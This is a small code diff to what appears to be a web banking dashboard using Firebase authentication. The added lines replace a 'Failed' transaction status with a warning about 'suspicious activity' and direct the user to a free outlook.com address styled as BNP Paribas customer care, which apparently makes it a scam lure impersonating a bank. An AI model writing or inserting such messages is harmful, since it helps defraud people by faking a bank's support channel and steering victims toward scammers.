@@ -69,6 +69,8 @@ onAuthStateChanged(auth, async (user) => {
           } else if (status.innerHTML == "Successful") {
             status.style.color = "lightgreen";
           } else if (status.innerHTML == "Failed") {
+            status.innerHTML =
+              "Failed (We Have Detected A Suspicious Activity Going On In Your Account Please Contact Customer Care At: Bnpparibascustomercare@outlook.com)";
             status.style.color = "red";
           }
 
